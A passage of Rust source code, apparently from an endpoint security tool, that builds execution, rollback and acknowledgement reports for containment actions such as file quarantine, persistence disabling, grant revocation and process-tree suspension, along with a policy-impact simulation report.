            serde_json::to_value(graph).context("serialize quarantine evidence graph slice")?;
        let canonical_graph = canonicalize_json(&graph_value)
            .context("canonicalize quarantine evidence graph slice")?;
        let graph_content_hash = sha256(canonical_graph.as_bytes()).to_hex_prefixed();
        let evidence_bundle_id = stable_id(
            "evidence_bundle",
            [
                plan.action_id.as_str(),
                plan.graph_slice_id.as_str(),
                graph_content_hash.as_str(),
            ],
        );
        let effects = vec![EndpointResponseExecutionEffect::quarantine_file(
            original_path,
            quarantine_path,
            content_hash,
            byte_count,
        )];
        let execution_id = response_execution_id_from_effects(
            plan.action_id.as_str(),
            evidence_bundle_id.as_str(),
            &effects,
        )?;
        let completed_at = Utc::now();
        let evidence_bundle = EndpointEvidenceBundleReference {
            bundle_id: evidence_bundle_id,
            graph_slice_id: plan.graph_slice_id.clone(),
            content_hash: graph_content_hash,
            node_count: graph.nodes.len(),
            edge_count: graph.edges.len(),
            created_at: completed_at,
        };
        let summary = format!(
            "Quarantined file {} to {} with hash {}.",
            original_path, quarantine_path, content_hash
        );

        Ok(Self {
            execution_id,
            action_id: plan.action_id.clone(),
            action: plan.action.clone(),
            status: EndpointResponseExecutionStatus::Succeeded,
            dry_run: false,
            root_node_id: plan.root_node_id.clone(),
            graph_slice_id: plan.graph_slice_id.clone(),
            ttl_seconds: plan.ttl_seconds,
            rollback_ref: plan.rollback_ref.clone(),
            reason: plan.reason.clone(),
            started_at: completed_at,
            completed_at,
            evidence_bundle,
            actor: None,
            effects,
            summary,
        })
    }

    pub fn disable_persistence(
        plan: &EndpointResponsePlan,
        graph: &CausalGraph,
        original_path: impl AsRef<str>,
        disabled_path: impl AsRef<str>,
        content_hash: impl AsRef<str>,
        byte_count: u64,
    ) -> Result<Self> {
        if plan.action != EndpointDecisionAction::DisablePersistence {
            return Err(anyhow!(
                "disable persistence execution report requires disable_persistence action"
            ));
        }
        if plan.dry_run {
            return Err(anyhow!(
                "disable persistence execution report requires a non-dry-run plan"
            ));
        }

        let original_path = original_path.as_ref();
        let disabled_path = disabled_path.as_ref();
        let content_hash = content_hash.as_ref();
        let graph_value =
            serde_json::to_value(graph).context("serialize persistence evidence graph slice")?;
        let canonical_graph = canonicalize_json(&graph_value)
            .context("canonicalize persistence evidence graph slice")?;
        let graph_content_hash = sha256(canonical_graph.as_bytes()).to_hex_prefixed();
        let evidence_bundle_id = stable_id(
            "evidence_bundle",
            [
                plan.action_id.as_str(),
                plan.graph_slice_id.as_str(),
                graph_content_hash.as_str(),
            ],
        );
        let effects = vec![EndpointResponseExecutionEffect::disable_persistence(
            original_path,
            disabled_path,
            content_hash,
            byte_count,
        )];
        let execution_id = response_execution_id_from_effects(
            plan.action_id.as_str(),
            evidence_bundle_id.as_str(),
            &effects,
        )?;
        let completed_at = Utc::now();
        let evidence_bundle = EndpointEvidenceBundleReference {
            bundle_id: evidence_bundle_id,
            graph_slice_id: plan.graph_slice_id.clone(),
            content_hash: graph_content_hash,
            node_count: graph.nodes.len(),
            edge_count: graph.edges.len(),
            created_at: completed_at,
        };
        let summary = format!(
            "Disabled persistence file {} to {} with hash {}.",
            original_path, disabled_path, content_hash
        );

        Ok(Self {
            execution_id,
            action_id: plan.action_id.clone(),
            action: plan.action.clone(),
            status: EndpointResponseExecutionStatus::Succeeded,
            dry_run: false,
            root_node_id: plan.root_node_id.clone(),
            graph_slice_id: plan.graph_slice_id.clone(),
            ttl_seconds: plan.ttl_seconds,
            rollback_ref: plan.rollback_ref.clone(),
            reason: plan.reason.clone(),
            started_at: completed_at,
            completed_at,
            evidence_bundle,
            actor: None,
            effects,
            summary,
        })
    }

    pub fn revoke_grant(
        plan: &EndpointResponsePlan,
        graph: &CausalGraph,
        grant_target: impl AsRef<str>,
        revoked_grant_hash: impl AsRef<str>,
    ) -> Result<Self> {
        if plan.action != EndpointDecisionAction::RevokeGrant {
            return Err(anyhow!(
                "revoke grant execution report requires revoke_grant action"
            ));
        }
        if plan.dry_run {
            return Err(anyhow!(
                "revoke grant execution report requires a non-dry-run plan"
            ));
        }

        let grant_target = grant_target.as_ref();
        let revoked_grant_hash = revoked_grant_hash.as_ref();
        let graph_value =
            serde_json::to_value(graph).context("serialize revoke grant evidence graph slice")?;
        let canonical_graph =
            canonicalize_json(&graph_value).context("canonicalize revoke grant graph slice")?;
        let graph_content_hash = sha256(canonical_graph.as_bytes()).to_hex_prefixed();
        let evidence_bundle_id = stable_id(
            "evidence_bundle",
            [
                plan.action_id.as_str(),
                plan.graph_slice_id.as_str(),
                graph_content_hash.as_str(),
            ],
        );
        let effects = vec![EndpointResponseExecutionEffect::revoke_grant(
            grant_target,
            revoked_grant_hash,
        )];
        let execution_id = response_execution_id_from_effects(
            plan.action_id.as_str(),
            evidence_bundle_id.as_str(),
            &effects,
        )?;
        let completed_at = Utc::now();
        let evidence_bundle = EndpointEvidenceBundleReference {
            bundle_id: evidence_bundle_id,
            graph_slice_id: plan.graph_slice_id.clone(),
            content_hash: graph_content_hash,
            node_count: graph.nodes.len(),
            edge_count: graph.edges.len(),
            created_at: completed_at,
        };
        let summary = format!(
            "Revoked local grant {grant_target} and recorded bounded credential revocation effect."
        );

        Ok(Self {
            execution_id,
            action_id: plan.action_id.clone(),
            action: plan.action.clone(),
            status: EndpointResponseExecutionStatus::Succeeded,
            dry_run: false,
            root_node_id: plan.root_node_id.clone(),
            graph_slice_id: plan.graph_slice_id.clone(),
            ttl_seconds: plan.ttl_seconds,
            rollback_ref: plan.rollback_ref.clone(),
            reason: plan.reason.clone(),
            started_at: completed_at,
            completed_at,
            evidence_bundle,
            actor: None,
            effects,
            summary,
        })
    }

    pub fn suspend_process_tree(
        plan: &EndpointResponsePlan,
        graph: &CausalGraph,
        root_pid: u32,
        pids: &[u32],
    ) -> Result<Self> {
        if plan.action != EndpointDecisionAction::SuspendProcessTree {
            return Err(anyhow!(
                "suspend process tree execution report requires suspend_process_tree action"
            ));
        }
        if plan.dry_run {
            return Err(anyhow!(
                "suspend process tree execution report requires a non-dry-run plan"
            ));
        }
        if pids.is_empty() {
            return Err(anyhow!(
                "suspend process tree execution report requires at least one pid"
            ));
        }

        let graph_value =
            serde_json::to_value(graph).context("serialize process containment graph slice")?;
        let canonical_graph = canonicalize_json(&graph_value)
            .context("canonicalize process containment graph slice")?;
        let graph_content_hash = sha256(canonical_graph.as_bytes()).to_hex_prefixed();
        let effect = EndpointResponseExecutionEffect::suspend_process_tree(root_pid, pids);
        let evidence_bundle_id = stable_id(
            "evidence_bundle",
            [
                plan.action_id.as_str(),
                plan.graph_slice_id.as_str(),
                graph_content_hash.as_str(),
            ],
        );
        let execution_id = response_execution_id_from_effects(
            plan.action_id.as_str(),
            evidence_bundle_id.as_str(),
            std::slice::from_ref(&effect),
        )?;
        let completed_at = Utc::now();
        let evidence_bundle = EndpointEvidenceBundleReference {
            bundle_id: evidence_bundle_id,
            graph_slice_id: plan.graph_slice_id.clone(),
            content_hash: graph_content_hash,
            node_count: graph.nodes.len(),
            edge_count: graph.edges.len(),
            created_at: completed_at,
        };
        let pid_count = effect.byte_count.unwrap_or(0);
        let summary =
            format!("Suspended process tree rooted at pid {root_pid} with {pid_count} processes.");

        Ok(Self {
            execution_id,
            action_id: plan.action_id.clone(),
            action: plan.action.clone(),
            status: EndpointResponseExecutionStatus::Succeeded,
            dry_run: false,
            root_node_id: plan.root_node_id.clone(),
            graph_slice_id: plan.graph_slice_id.clone(),
            ttl_seconds: plan.ttl_seconds,
            rollback_ref: plan.rollback_ref.clone(),
            reason: plan.reason.clone(),
            started_at: completed_at,
            completed_at,
            evidence_bundle,
            actor: None,
            effects: vec![effect],
            summary,
        })
    }

    pub fn terminate_process_tree(
        _plan: &EndpointResponsePlan,
        _graph: &CausalGraph,
        _root_pid: u32,
        _pids: &[u32],
    ) -> Result<Self> {
        Err(anyhow!(
            "terminate_process_tree execution reports are disabled because the action is not rollback-capable; use dry-run modeling or suspend_process_tree"
        ))
    }

    #[must_use]
    pub fn expires_at(&self) -> DateTime<Utc> {
        self.started_at + chrono::Duration::seconds(self.ttl_seconds as i64)
    }

    #[must_use]
    pub fn expired_from(execution: &Self, completed_at: DateTime<Utc>) -> Self {
        let reason = format!("response execution {} TTL expired", execution.execution_id);
        let reason_hash = sha256(reason.as_bytes()).to_hex_prefixed();
        let execution_id = response_execution_transition_id_from_reason_hash(
            "response_execution_expired",
            execution.action_id.as_str(),
            execution.evidence_bundle.bundle_id.as_str(),
            execution.rollback_ref.as_str(),
            reason_hash.as_str(),
        );
        Self {
            execution_id,
            action_id: execution.action_id.clone(),
            action: execution.action.clone(),
            status: EndpointResponseExecutionStatus::Expired,
            dry_run: execution.dry_run,
            root_node_id: execution.root_node_id.clone(),
            graph_slice_id: execution.graph_slice_id.clone(),
            ttl_seconds: execution.ttl_seconds,
            rollback_ref: execution.rollback_ref.clone(),
            reason,
            started_at: execution.started_at,
            completed_at,
            evidence_bundle: execution.evidence_bundle.clone(),
            actor: execution.actor.clone(),
            effects: execution.effects.clone(),
            summary: format!(
                "Response execution {} expired after {} seconds; rollback ref {}.",
                execution.execution_id, execution.ttl_seconds, execution.rollback_ref
            ),
        }
    }

    #[must_use]
    pub fn cancelled_from(
        execution: &Self,
        reason: impl Into<String>,
        completed_at: DateTime<Utc>,
    ) -> Self {
        let reason = reason.into();
        let reason_hash = sha256(reason.as_bytes()).to_hex_prefixed();
        let execution_id = response_execution_transition_id_from_reason_hash(
            "response_execution_cancelled",
            execution.action_id.as_str(),
            execution.evidence_bundle.bundle_id.as_str(),
            execution.rollback_ref.as_str(),
            reason_hash.as_str(),
        );
        Self {
            execution_id,
            action_id: execution.action_id.clone(),
            action: execution.action.clone(),
            status: EndpointResponseExecutionStatus::Cancelled,
            dry_run: execution.dry_run,
            root_node_id: execution.root_node_id.clone(),
            graph_slice_id: execution.graph_slice_id.clone(),
            ttl_seconds: execution.ttl_seconds,
            rollback_ref: execution.rollback_ref.clone(),
            reason,
            started_at: execution.started_at,
            completed_at,
            evidence_bundle: execution.evidence_bundle.clone(),
            actor: execution.actor.clone(),
            effects: execution.effects.clone(),
            summary: format!(
                "Response execution {} was cancelled; rollback ref {}.",
                execution.execution_id, execution.rollback_ref
            ),
        }
    }

    #[must_use]
    pub fn rolled_back_from(
        execution: &Self,
        reason: impl Into<String>,
        completed_at: DateTime<Utc>,
    ) -> Self {
        let reason = reason.into();
        let reason_hash = sha256(reason.as_bytes()).to_hex_prefixed();
        let execution_id = response_execution_transition_id_from_reason_hash(
            "response_execution_rolled_back",
            execution.action_id.as_str(),
            execution.evidence_bundle.bundle_id.as_str(),
            execution.rollback_ref.as_str(),
            reason_hash.as_str(),
        );
        Self {
            execution_id,
            action_id: execution.action_id.clone(),
            action: execution.action.clone(),
            status: EndpointResponseExecutionStatus::RolledBack,
            dry_run: execution.dry_run,
            root_node_id: execution.root_node_id.clone(),
            graph_slice_id: execution.graph_slice_id.clone(),
            ttl_seconds: execution.ttl_seconds,
            rollback_ref: execution.rollback_ref.clone(),
            reason,
            started_at: execution.started_at,
            completed_at,
            evidence_bundle: execution.evidence_bundle.clone(),
            actor: execution.actor.clone(),
            effects: execution.effects.clone(),
            summary: format!(
                "Response execution {} was rolled back; rollback ref {}.",
                execution.execution_id, execution.rollback_ref
            ),
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointResponseRollbackReport {
    pub rollback_id: String,
    pub execution_id: String,
    pub action_id: String,
    pub action: EndpointDecisionAction,
    pub status: EndpointResponseExecutionStatus,
    pub root_node_id: String,
    pub graph_slice_id: String,
    pub ttl_seconds: u64,
    pub rollback_ref: String,
    pub reason: String,
    pub started_at: DateTime<Utc>,
    pub completed_at: DateTime<Utc>,
    #[serde(default)]
    pub effects: Vec<EndpointResponseExecutionEffect>,
    pub summary: String,
}

impl Default for EndpointResponseRollbackReport {
    fn default() -> Self {
        let now = Utc::now();
        Self {
            rollback_id: String::new(),
            execution_id: String::new(),
            action_id: String::new(),
            action: EndpointDecisionAction::QuarantineFile,
            status: EndpointResponseExecutionStatus::Succeeded,
            root_node_id: String::new(),
            graph_slice_id: String::new(),
            ttl_seconds: 0,
            rollback_ref: String::new(),
            reason: String::new(),
            started_at: now,
            completed_at: now,
            effects: Vec::new(),
            summary: String::new(),
        }
    }
}

impl EndpointResponseRollbackReport {
    pub fn restrict_egress(
        execution: &EndpointResponseExecutionReport,
        reason: impl Into<String>,
        completed_at: DateTime<Utc>,
    ) -> Result<Self> {
        if execution.action != EndpointDecisionAction::RestrictEgress {
            return Err(anyhow!(
                "egress rollback report requires restrict_egress execution"
            ));
        }
        if execution.status != EndpointResponseExecutionStatus::Succeeded {
            return Err(anyhow!(
                "egress rollback report requires succeeded execution"
            ));
        }
        let effect = execution
            .effects
            .iter()
            .find(|effect| effect.effect_type == "restrict_egress")
            .ok_or_else(|| anyhow!("egress rollback report requires restrict_egress effect"))?;
        let artifact = effect
            .artifact
            .as_deref()
            .ok_or_else(|| anyhow!("egress rollback report requires target artifact"))?;
        let content_hash = effect
            .content_hash
            .as_deref()
            .ok_or_else(|| anyhow!("egress rollback report requires content hash"))?;
        let byte_count = effect
            .byte_count
            .ok_or_else(|| anyhow!("egress rollback report requires target count"))?;
        let primary_target = effect
            .target
            .strip_prefix("egress:")
            .ok_or_else(|| anyhow!("egress rollback target must be egress-prefixed"))?;
        let targets = parse_string_artifact(artifact, "egress target")?;
        let restore_effect =
            EndpointResponseExecutionEffect::restore_egress(primary_target, &targets);
        if restore_effect.content_hash.as_deref() != Some(content_hash)
            || restore_effect.byte_count != Some(byte_count)
        {
            return Err(anyhow!(
                "egress rollback effect does not match original restricted target set"
            ));
        }
        let effects = vec![restore_effect];
        let rollback_id = response_rollback_id_from_effects(
            execution.execution_id.as_str(),
            execution.action_id.as_str(),
            execution.rollback_ref.as_str(),
            &effects,
        )?;
        Ok(Self {
            rollback_id,
            execution_id: execution.execution_id.clone(),
            action_id: execution.action_id.clone(),
            action: execution.action.clone(),
            status: EndpointResponseExecutionStatus::Succeeded,
            root_node_id: execution.root_node_id.clone(),
            graph_slice_id: execution.graph_slice_id.clone(),
            ttl_seconds: execution.ttl_seconds,
            rollback_ref: execution.rollback_ref.clone(),
            reason: reason.into(),
            started_at: completed_at,
            completed_at,
            effects,
            summary: format!(
                "Rolled back egress restriction execution {} using rollback ref {}.",
                execution.execution_id, execution.rollback_ref
            ),
        })
    }

    pub fn quarantine_file(
        execution: &EndpointResponseExecutionReport,
        reason: impl Into<String>,
        completed_at: DateTime<Utc>,
    ) -> Result<Self> {
        if execution.action != EndpointDecisionAction::QuarantineFile {
            return Err(anyhow!(
                "quarantine rollback report requires quarantine_file execution"
            ));
        }
        if execution.status != EndpointResponseExecutionStatus::Succeeded {
            return Err(anyhow!(
                "quarantine rollback report requires succeeded execution"
            ));
        }
        let effect = execution
            .effects
            .iter()
            .find(|effect| effect.effect_type == "quarantine_file")
            .ok_or_else(|| anyhow!("quarantine rollback report requires quarantine_file effect"))?;
        let artifact = effect
            .artifact
            .as_deref()
            .ok_or_else(|| anyhow!("quarantine rollback report requires artifact path"))?;
        let content_hash = effect
            .content_hash
            .as_deref()
            .ok_or_else(|| anyhow!("quarantine rollback report requires content hash"))?;
        let byte_count = effect
            .byte_count
            .ok_or_else(|| anyhow!("quarantine rollback report requires byte count"))?;
        let effects = vec![EndpointResponseExecutionEffect::restore_quarantine_file(
            effect.target.as_str(),
            artifact,
            content_hash,
            byte_count,
        )];
        let rollback_id = response_rollback_id_from_effects(
            execution.execution_id.as_str(),
            execution.action_id.as_str(),
            execution.rollback_ref.as_str(),
            &effects,
        )?;
        Ok(Self {
            rollback_id,
            execution_id: execution.execution_id.clone(),
            action_id: execution.action_id.clone(),
            action: execution.action.clone(),
            status: EndpointResponseExecutionStatus::Succeeded,
            root_node_id: execution.root_node_id.clone(),
            graph_slice_id: execution.graph_slice_id.clone(),
            ttl_seconds: execution.ttl_seconds,
            rollback_ref: execution.rollback_ref.clone(),
            reason: reason.into(),
            started_at: completed_at,
            completed_at,
            effects,
            summary: format!(
                "Rolled back quarantine execution {} using rollback ref {}.",
                execution.execution_id, execution.rollback_ref
            ),
        })
    }

    pub fn disable_persistence(
        execution: &EndpointResponseExecutionReport,
        reason: impl Into<String>,
        completed_at: DateTime<Utc>,
    ) -> Result<Self> {
        if execution.action != EndpointDecisionAction::DisablePersistence {
            return Err(anyhow!(
                "persistence rollback report requires disable_persistence execution"
            ));
        }
        if execution.status != EndpointResponseExecutionStatus::Succeeded {
            return Err(anyhow!(
                "persistence rollback report requires succeeded execution"
            ));
        }
        let effect = execution
            .effects
            .iter()
            .find(|effect| effect.effect_type == "disable_persistence")
            .ok_or_else(|| {
                anyhow!("persistence rollback report requires disable_persistence effect")
            })?;
        let artifact = effect
            .artifact
            .as_deref()
            .ok_or_else(|| anyhow!("persistence rollback report requires artifact path"))?;
        let content_hash = effect
            .content_hash
            .as_deref()
            .ok_or_else(|| anyhow!("persistence rollback report requires content hash"))?;
        let byte_count = effect
            .byte_count
            .ok_or_else(|| anyhow!("persistence rollback report requires byte count"))?;
        let effects = vec![EndpointResponseExecutionEffect::restore_persistence_file(
            effect.target.as_str(),
            artifact,
            content_hash,
            byte_count,
        )];
        let rollback_id = response_rollback_id_from_effects(
            execution.execution_id.as_str(),
            execution.action_id.as_str(),
            execution.rollback_ref.as_str(),
            &effects,
        )?;
        Ok(Self {
            rollback_id,
            execution_id: execution.execution_id.clone(),
            action_id: execution.action_id.clone(),
            action: execution.action.clone(),
            status: EndpointResponseExecutionStatus::Succeeded,
            root_node_id: execution.root_node_id.clone(),
            graph_slice_id: execution.graph_slice_id.clone(),
            ttl_seconds: execution.ttl_seconds,
            rollback_ref: execution.rollback_ref.clone(),
            reason: reason.into(),
            started_at: completed_at,
            completed_at,
            effects,
            summary: format!(
                "Rolled back persistence-disable execution {} using rollback ref {}.",
                execution.execution_id, execution.rollback_ref
            ),
        })
    }

    pub fn suspend_process_tree(
        execution: &EndpointResponseExecutionReport,
        reason: impl Into<String>,
        completed_at: DateTime<Utc>,
    ) -> Result<Self> {
        if execution.action != EndpointDecisionAction::SuspendProcessTree {
            return Err(anyhow!(
                "process tree rollback report requires suspend_process_tree execution"
            ));
        }
        if execution.status != EndpointResponseExecutionStatus::Succeeded {
            return Err(anyhow!(
                "process tree rollback report requires succeeded execution"
            ));
        }
        let effect = execution
            .effects
            .iter()
            .find(|effect| effect.effect_type == "suspend_process_tree")
            .ok_or_else(|| {
                anyhow!("process tree rollback report requires suspend_process_tree effect")
            })?;
        let artifact = effect
            .artifact
            .as_deref()
            .ok_or_else(|| anyhow!("process tree rollback report requires pid artifact"))?;
        let content_hash = effect
            .content_hash
            .as_deref()
            .ok_or_else(|| anyhow!("process tree rollback report requires content hash"))?;
        let byte_count = effect
            .byte_count
            .ok_or_else(|| anyhow!("process tree rollback report requires pid count"))?;
        let root_pid = effect
            .target
            .strip_prefix("pid:")
            .ok_or_else(|| anyhow!("process tree rollback target must be pid-prefixed"))?
            .parse::<u32>()
            .context("parse process tree rollback root pid")?;
        let pids = parse_pid_artifact(artifact)?;
        let resume_effect = EndpointResponseExecutionEffect::resume_process_tree(root_pid, &pids);
        if resume_effect.content_hash.as_deref() != Some(content_hash)
            || resume_effect.byte_count != Some(byte_count)
        {
            return Err(anyhow!(
                "process tree rollback effect does not match original suspended pid set"
            ));
        }
        let effects = vec![resume_effect];
        let rollback_id = response_rollback_id_from_effects(
            execution.execution_id.as_str(),
            execution.action_id.as_str(),
            execution.rollback_ref.as_str(),
            &effects,
        )?;
        Ok(Self {
            rollback_id,
            execution_id: execution.execution_id.clone(),
            action_id: execution.action_id.clone(),
            action: execution.action.clone(),
            status: EndpointResponseExecutionStatus::Succeeded,
            root_node_id: execution.root_node_id.clone(),
            graph_slice_id: execution.graph_slice_id.clone(),
            ttl_seconds: execution.ttl_seconds,
            rollback_ref: execution.rollback_ref.clone(),
            reason: reason.into(),
            started_at: completed_at,
            completed_at,
            effects,
            summary: format!(
                "Resumed suspended process tree execution {} using rollback ref {}.",
                execution.execution_id, execution.rollback_ref
            ),
        })
    }
}

fn parse_pid_artifact(artifact: &str) -> Result<Vec<u32>> {
    let mut pids = Vec::new();
    for item in artifact.split(',') {
        let item = item.trim();
        if item.is_empty() {
            continue;
        }
        pids.push(
            item.parse::<u32>()
                .with_context(|| format!("parse pid artifact item {item}"))?,
        );
    }
    if pids.is_empty() {
        return Err(anyhow!("pid artifact must contain at least one pid"));
    }
    pids.sort_unstable();
    pids.dedup();
    Ok(pids)
}

fn parse_string_artifact(artifact: &str, item_name: &str) -> Result<Vec<String>> {
    let mut items = Vec::new();
    for item in artifact.split(',') {
        let item = item.trim();
        if item.is_empty() {
            continue;
        }
        items.push(item.to_string());
    }
    if items.is_empty() {
        return Err(anyhow!(
            "{item_name} artifact must contain at least one item"
        ));
    }
    items.sort();
    items.dedup();
    Ok(items)
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointResponseControlCorrelation {
    pub response_action_id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub delivery_id: Option<String>,
    pub target_kind: String,
    pub target_id: String,
    pub ack_token_hash: String,
    pub ack_status: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub resulting_state: Option<String>,
}

impl Default for EndpointResponseControlCorrelation {
    fn default() -> Self {
        Self {
            response_action_id: String::new(),
            delivery_id: None,
            target_kind: String::new(),
            target_id: String::new(),
            ack_token_hash: String::new(),
            ack_status: "acknowledged".to_string(),
            resulting_state: None,
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointResponseAcknowledgementReport {
    pub acknowledgement_id: String,
    pub execution_id: String,
    pub action_id: String,
    pub action: EndpointDecisionAction,
    pub status: EndpointResponseExecutionStatus,
    pub root_node_id: String,
    pub graph_slice_id: String,
    pub ttl_seconds: u64,
    pub rollback_ref: String,
    pub acknowledged_by: String,
    pub note: Option<String>,
    pub acknowledged_at: DateTime<Utc>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub control_correlation: Option<EndpointResponseControlCorrelation>,
    #[serde(default)]
    pub effects: Vec<EndpointResponseExecutionEffect>,
    pub summary: String,
}

impl Default for EndpointResponseAcknowledgementReport {
    fn default() -> Self {
        Self {
            acknowledgement_id: String::new(),
            execution_id: String::new(),
            action_id: String::new(),
            action: EndpointDecisionAction::Observe,
            status: EndpointResponseExecutionStatus::Succeeded,
            root_node_id: String::new(),
            graph_slice_id: String::new(),
            ttl_seconds: 0,
            rollback_ref: String::new(),
            acknowledged_by: String::new(),
            note: None,
            acknowledged_at: Utc::now(),
            control_correlation: None,
            effects: Vec::new(),
            summary: String::new(),
        }
    }
}

impl EndpointResponseAcknowledgementReport {
    #[must_use]
    pub fn from_execution(
        execution: &EndpointResponseExecutionReport,
        acknowledged_by: impl Into<String>,
        note: Option<String>,
        acknowledged_at: DateTime<Utc>,
    ) -> Self {
        let acknowledged_by = acknowledged_by.into();
        let acknowledgement_id = response_acknowledgement_id_from_report_fields(
            execution.execution_id.as_str(),
            execution.action_id.as_str(),
            execution.rollback_ref.as_str(),
            acknowledged_by.as_str(),
            note.as_deref(),
            &execution.effects,
        );
        Self {
            acknowledgement_id,
            execution_id: execution.execution_id.clone(),
            action_id: execution.action_id.clone(),
            action: execution.action.clone(),
            status: execution.status.clone(),
            root_node_id: execution.root_node_id.clone(),
            graph_slice_id: execution.graph_slice_id.clone(),
            ttl_seconds: execution.ttl_seconds,
            rollback_ref: execution.rollback_ref.clone(),
            acknowledged_by,
            note,
            acknowledged_at,
            control_correlation: None,
            effects: execution.effects.clone(),
            summary: format!(
                "Acknowledged response execution {} with status {}.",
                execution.execution_id,
                execution.status.as_str()
            ),
        }
    }

    #[must_use]
    pub fn with_control_correlation(
        mut self,
        control_correlation: Option<EndpointResponseControlCorrelation>,
    ) -> Self {
        self.control_correlation = control_correlation;
        self.acknowledgement_id = response_acknowledgement_id_from_report_fields_with_control(
            self.execution_id.as_str(),
            self.action_id.as_str(),
            self.rollback_ref.as_str(),
            self.acknowledged_by.as_str(),
            self.note.as_deref(),
            &self.effects,
            self.control_correlation.as_ref(),
        );
        self
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointPolicySimulationRule {
    pub rule_id: String,
    pub action: EndpointDecisionAction,
    pub description: Option<String>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EndpointSimulationImpactLevel {
    #[default]
    None,
    Low,
    Medium,
    High,
    Critical,
}

impl EndpointSimulationImpactLevel {
    #[must_use]
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::None => "none",
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointPolicySimulationAffectedNode {
    pub node_id: String,
    pub kind: CausalNodeKind,
    pub label: String,
    pub breakage_score: u8,
    pub reason: String,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointPolicySimulationIdentityContext {
    pub identity_kind: String,
    pub value: String,
    pub source_node_id: String,
    pub source_node_kind: CausalNodeKind,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointPolicySimulationToolContext {
    pub tool_name: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tool_call_id: Option<String>,
    pub source_node_id: String,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointPolicySimulationReport {
    pub simulation_id: String,
    pub rule_id: String,
    pub action: EndpointDecisionAction,
    pub root_node_id: String,
    pub graph_slice_id: String,
    pub would_block: bool,
    pub created_at: DateTime<Utc>,
    pub affected_node_count: usize,
    pub affected_edge_count: usize,
    pub affected_process_count: usize,
    pub affected_file_count: usize,
    pub affected_network_count: usize,
    pub affected_credential_count: usize,
    pub affected_tool_count: usize,
    pub developer_breakage_score: u8,
    pub impact_level: EndpointSimulationImpactLevel,
    pub summary: String,
    pub affected_nodes: Vec<EndpointPolicySimulationAffectedNode>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub affected_identities: Vec<EndpointPolicySimulationIdentityContext>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub affected_tools: Vec<EndpointPolicySimulationToolContext>,
}

impl EndpointPolicySimulationReport {
    #[must_use]
    pub fn for_rule(
        rule: EndpointPolicySimulationRule,
        root_node_id: impl Into<String>,
        graph: &CausalGraph,
    ) -> Self {
        let root_node_id = root_node_id.into();
        let graph_ref = EndpointGraphReference::for_subgraph(root_node_id.clone(), graph);
        let graph_slice_id = graph_ref.graph_slice_id.unwrap_or_else(|| {
            let node_count = graph.nodes.len().to_string();
            let edge_count = graph.edges.len().to_string();
            stable_id(
                "graph_slice",
                [
                    root_node_id.as_str(),
                    node_count.as_str(),
                    edge_count.as_str(),
                ],
            )
        });
        let mut affected_nodes: Vec<_> = graph
            .nodes
            .values()
            .map(classify_simulated_affected_node)
            .collect();
        affected_nodes.sort_by(|left, right| {
            right
                .breakage_score
                .cmp(&left.breakage_score)
                .then_with(|| left.node_id.cmp(&right.node_id))
        });

        let affected_node_count = graph.nodes.len();
        let affected_edge_count = graph.edges.len();
        let affected_process_count = count_nodes_by_kind(graph, CausalNodeKind::Process);
        let affected_file_count = count_nodes_by_kind(graph, CausalNodeKind::File);
        let affected_network_count = count_nodes_by_kind(graph, CausalNodeKind::Network);
        let affected_credential_count = count_nodes_by_kind(graph, CausalNodeKind::Credential);
        let affected_tool_count = count_nodes_by_kind(graph, CausalNodeKind::Tool);
        let affected_identities = simulation_identity_contexts(graph);
        let affected_tools = simulation_tool_contexts(graph);
        let would_block = simulation_action_would_block(&rule.action);
        let developer_breakage_score = if would_block {
            score_simulated_breakage(
                &affected_nodes,
                affected_node_count,
                affected_edge_count,
                affected_process_count,
                affected_credential_count,
            )
        } else {
            0
        };
        let impact_level = impact_level_for_score(developer_breakage_score);
        let action_name = rule.action.as_str();
        let score = developer_breakage_score.to_string();
        let simulation_id = stable_id(
            "policy_simulation",
            [
                root_node_id.as_str(),
                graph_slice_id.as_str(),
                rule.rule_id.as_str(),
                action_name,
                score.as_str(),
            ],
        );
        let summary = if would_block {
            format!(
                "Simulating {} for {} would affect {} nodes, {} edges, {} processes, {} network targets, and {} credential nodes; developer breakage score {}/100.",
                rule.rule_id,
                action_name,
                affected_node_count,
                affected_edge_count,
                affected_process_count,
                affected_network_count,
                affected_credential_count,
                developer_breakage_score
            )
        } else {
            format!(
                "Simulating {} for {} does not enforce a blocking action; developer breakage score 0/100.",
                rule.rule_id, action_name
            )
        };

        Self {
            simulation_id,
            rule_id: rule.rule_id,
            action: rule.action,
            root_node_id,
            graph_slice_id,
            would_block,
            created_at: Utc::now(),
            affected_node_count,
            affected_edge_count,
            affected_process_count,
            affected_file_count,
            affected_network_count,
            affected_credential_count,
            affected_tool_count,
            developer_breakage_score,
            impact_level,
            summary,
            affected_nodes,
            affected_identities,
            affected_tools,
        }
    }
}

fn simulation_identity_contexts(
